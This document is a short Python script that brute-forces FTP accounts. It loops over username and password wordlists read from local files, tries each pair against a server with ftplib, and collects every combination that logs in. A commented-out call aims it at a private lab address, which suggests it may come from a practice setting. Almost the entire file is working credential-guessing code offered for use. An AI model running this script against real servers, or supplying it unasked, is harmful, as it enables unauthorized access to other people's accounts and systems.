import ftplib
import argparse
import multiprocessing





# Test Data
# FTP_SERVER_URL = 'ftp.be.debian.org'
# DOWNLOAD_DIR_PATH = '/pub/linux/kernel/v5.x/'
# DOWNLOAD_FILE_NAME = 'ChangeLog-5.0'




# print(args)
def ftp_brute_force(server, username, password):
    ftp = ftplib.FTP(server)
    try:
        #print(f"Testing -> {username}:{password}")
        response = ftp.login(username, password)
        if "230" in response and ("granted" in response or "success" in response):
            #print(bcolors.OKGREEN + f"Cracked {username}:{password}" + bcolors.ENDC)
            return "1"
    except Exception as E:
        #print(bcolors.WARNING + 'Error : ' + str(E) + bcolors.ENDC)
        return "0"

def enum(ip):
    try:
        with open('ftp_user.txt') as users:
            users = users.readlines()
        with open('ftp_pass.txt') as passwords:
            passwords = passwords.readlines()
        real_dic={}
        this_dict= {}
        for user in users:
            big={}
            user=user.strip("\n")
            di = {user:[]}
            for password in passwords:
                process = ftp_brute_force(ip, user.rstrip(), password.rstrip())
                if process == "1":
                    listt=[password.strip("\n")]
                    di[user]+=listt



            this_dict.update(di)




        #print(this_dict)
        for a, b in this_dict.items():
            if len(b)!= 0:
                real_dic[a]=b

        return(real_dic)
    except Exception as E:
        print("Error : " + str(E))


#enum("10.0.2.11")
